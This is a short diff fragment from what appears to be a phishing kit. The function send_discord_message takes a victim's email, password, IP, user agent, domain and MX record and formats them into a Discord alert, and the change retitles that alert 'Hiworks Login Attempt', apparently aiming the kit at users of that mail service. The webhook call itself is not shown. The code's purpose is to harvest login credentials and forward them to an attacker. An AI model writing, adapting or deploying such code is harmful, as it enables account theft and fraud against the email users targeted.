@@ -30,7 +30,7 @@ def send_discord_message(email, password, ip, useragent, domain, mx_record):
         "avatar_url": "https://i.imgur.com/zW2WJ3o.png",  # Optional bot avatar
         "embeds": [
             {
-                "title": "🔔 New Login Attempt",
+                "title": "🔔 Hiworks Login Attempt",
                 "color": 16711680,  # Red color in Discord embed
                 "fields": [
                     {"name": "📧 Email", "value": f"`{email}`", "inline": False},
